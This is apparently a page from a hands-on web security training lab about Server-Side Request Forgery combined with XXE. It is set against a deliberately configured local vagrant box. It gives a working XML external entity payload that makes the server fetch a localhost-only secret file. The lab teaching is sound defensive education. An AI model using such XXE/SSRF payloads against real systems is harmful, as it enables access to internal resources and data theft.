---
title: "SSRF"
weight: 45
---

{{% notice note %}}
We will do these exercises on the Basic XXE (`/basic-xxe.do`) page.
{{% /notice %}}

Server-Side Request Forgery (SSRF) is easily accomplished when combined with XXE.

I have configured nginx on the vagrant box to only allow the localhost access to the `http://localhost:3333/secret.txt` file. Using SSRF see if you can read the contents.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3333/secret.txt">]>

<doc>&xxe;</doc>
```

![](/static/img/secret.png)
